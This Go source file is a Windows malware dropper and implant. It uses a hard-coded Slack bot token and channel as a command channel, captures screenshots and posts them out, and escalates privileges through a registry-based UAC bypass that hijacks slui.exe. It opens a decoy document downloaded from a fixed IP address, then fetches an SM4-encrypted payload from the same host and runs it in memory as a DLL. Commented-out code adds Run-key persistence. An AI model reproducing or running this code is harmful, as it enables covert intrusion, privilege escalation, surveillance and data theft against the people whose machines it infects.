package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"image"
	"image/png"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/nfnt/resize"
	"github.com/nkbai/go-memorydll"
	"github.com/tidwall/gjson"
	"github.com/tjfoc/gmsm/sm4"
	"golang.org/x/sys/windows/registry"
)

var (
	scale       = flag.Int("scale", 1, "scale")
	Channel     = "C022G7UH6KC"
	HistoryApi  = "https://slack.com/api/conversations.history?channel=" + Channel + "&limit=1&pretty=1"
	PostMessage = "https://slack.com/api/chat.postMessage"
	FileUpload  = "https://slack.com/api/files.upload"
	Token       = "xoxb-2096881397969-2084273596082-MNf9WXCRIqLmZQODxUkKAm7r"
)

// UAC bypass ported from https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation/blob/master/SluiFileHandlerHijackLPE/SluiFileHandlerHijackLPE.cpp
func createRegistryKey(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func deleteRegistryKey(keyPath, keyName string) (err error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	err = registry.DeleteKey(key, keyName)
	return
}

func bypassUAC(command string) (err error) {
	regKeyStr := `Software\Classes\exefile\shell\open\command`
	createRegistryKey(regKeyStr)
	key, err := registry.OpenKey(registry.CURRENT_USER, regKeyStr, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	err = key.SetStringValue("", command)
	if err != nil {
		return
	}
	shell32 := syscall.MustLoadDLL("Shell32.dll")
	shellExecuteW := shell32.MustFindProc("ShellExecuteW")
	runasStr, _ := syscall.UTF16PtrFromString("runas")
	sluiStr, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\slui.exe")
	r1, _, err := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
	if r1 < 32 {
		return
	}
	// Wait for the command to trigger
	time.Sleep(time.Second * 3)
	// Clean up
	deleteRegistryKey(`Software\Classes\exefile\shell\open\`, "command")
	deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
	return
}

var Timer = 10

func sleep() {
	fmt.Sprintf("sleep %s", Timer)
	time.Sleep(time.Duration(Timer) * time.Second)
}

func ExecCommand(command []string) (out string) {
	fmt.Println(command)
	cmd := exec.Command(command[0], command[1:]...)
	o, err := cmd.CombinedOutput()

	if err != nil {
		out = fmt.Sprintf("shell run error: \n%s\n", err)
	} else {
		out = fmt.Sprintf("combined out:\n%s\n", string(o))
	}
	return
}

func ApiGethistory(apiUrl string, rule string) gjson.Result {
	data := url.Values{"content": nil, "token": {Token}}
	body := strings.NewReader(data.Encode())
	r, err := http.NewRequest("POST", apiUrl, body)
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	response, err := http.DefaultClient.Do(r)
	defer response.Body.Close()
	if err != nil {
		return gjson.Result{}
	}
	bytes, _ := ioutil.ReadAll(response.Body)
	log.Println(string(bytes))
	return gjson.GetBytes(bytes, rule)
}
func ApiPost(text string, apiUrl string) {
	var r http.Request
	r.ParseForm()
	r.Form.Add("token", Token)
	r.Form.Add("channel", Channel)
	r.Form.Add("pretty", "1")
	r.Form.Add("text", text)
	r.Form.Add("mrkdwn", "false")
	body := strings.NewReader(r.Form.Encode())
	response, err := http.Post(apiUrl, "application/x-www-form-urlencoded", body)
	if err != nil {
		return
	}
	bytes, _ := ioutil.ReadAll(response.Body)
	ok := gjson.GetBytes(bytes, "ok")
	fmt.Println(ok)
}

func CaptureDisplayAndSendMail() {
	rect := screenshot.GetDisplayBounds(0)
	if *scale != 1 {
		rect.Max = rect.Max.Mul(*scale)
	}

	var img image.Image
	img, _ = screenshot.CaptureRect(rect)
	if *scale != 1 {
		img = resize.Resize(uint(img.Bounds().Dx()/(*scale)), 0, img, resize.Lanczos3)
	}

	filename := "screenshot_" + time.Now().Format("20060102150405") + ".png"
	file, _ := os.Create(filename)
	png.Encode(file, img)
	file.Close()

	photo_bs4 := base64cover(filename)
	ApiPost(photo_bs4, PostMessage)
	os.Remove(filename)

}

func TempDir() string { //获取temp目录
	const pathSep = '\\'
	dirw := make([]uint16, syscall.MAX_PATH)
	n, _ := syscall.GetTempPath(uint32(len(dirw)), &dirw[0])
	if n > uint32(len(dirw)) {
		dirw = make([]uint16, n)
		n, _ = syscall.GetTempPath(uint32(len(dirw)), &dirw[0])
		if n > uint32(len(dirw)) {
			n = 0
		}
	}
	if n > 0 && dirw[n-1] == pathSep {
		n--
	}
	return string(utf16.Decode(dirw[0:n]))
}

func openbrowser(url string) { //打开资源文件
	var err error
	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}
	if err != nil {
		log.Fatal(err)
	}
}

func base64cover(filepath string) string {
	data, err := ioutil.ReadFile(filepath)
	if err != nil {
		panic(err)
	}
	base64Str := base64.StdEncoding.EncodeToString(data)
	return base64Str
}

func Proceed() {
	tmp := TempDir()
	fmt.Println(tmp)
	key := []byte("1234567890abcdef")                       // 生成密钥对
	src := "http://192.168.175.129:80/download/file.ext"    //你的bin
	file_src := "http://192.168.175.129:80/download/my.doc" //你的pdf文件
	var msg []byte
	var CL http.Client
	resp_doc, err := CL.Get(file_src)
	if err != nil {
		log.Fatal(err)
	}
	defer resp_doc.Body.Close()
	if resp_doc.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp_doc.Body)
		if err != nil {
			log.Fatal(err)
		}
		ioutil.WriteFile(tmp+"/my.jpg", bodyBytes, 0644)
	}
	openbrowser(tmp + "/my.jpg")
	resp_bin, err := CL.Get(src)
	if err != nil {
		log.Fatal(err)
	}
	defer resp_bin.Body.Close()
	if resp_bin.StatusCode == http.StatusOK {

		bodyBytes, err := ioutil.ReadAll(resp_bin.Body)
		if err != nil {
			log.Fatal(err)
		}
		msg = bodyBytes
	}

	charcode, err := sm4.Sm4Ecb(key, msg, false) //sm4Ecb模式pksc7填充解密
	dll, err := memorydll.NewDLL(charcode, "example.dll")
	if err != nil {
		log.Fatal(err)
		return
	}
	proc, err := dll.FindProc("StartW")
	if err != nil {
		log.Fatal(err)
		return
	}
	proc.Call()
}

func main() {

	// current, _ := os.Getwd()
	// //	u, err := user.Current()
	// tmp := TempDir()
	// //log.Println("c:\\windows\\system32\\cmd.exe /c copy " + "\"" + current + "\\photo_version.exe\" \"C:\\Users\\" + u.username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartupEaplore.exe\"")
	// //log.Println("c:\\windows\\system32\\cmd.exe /c copy " + "\"" + current + "\\pstart.exe\" " + "\"" + tmp + "\\Eaplore.exe\"")
	// key, _ := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	// strs, _, _ := key.GetStringValue("test")
	// if strs == "" {
	// 	//写入计划表，uac
	// 	bypassUAC("c:\\windows\\system32\\cmd.exe /c copy " + "\"" + current + "\\pstart.exe\" " + "\"" + tmp + "\\Eaplore.exe\"")
	// 	reg_start := "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v test /t REG_SZ /d \"" + tmp + "\\Eaplore.exe\""
	// 	log.Println("c:\\windows\\system32\\cmd.exe /c " + reg_start)
	// 	bypassUAC("c:\\windows\\system32\\cmd.exe /c " + reg_start)
	// }

	// //bypassUAC("copy " + current + "/photo_version.exe \"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Eaplore.exe\"")
	// // CaptureDisplayAndSendMail()
	// // log.Println(11111)
	Proceed()
}
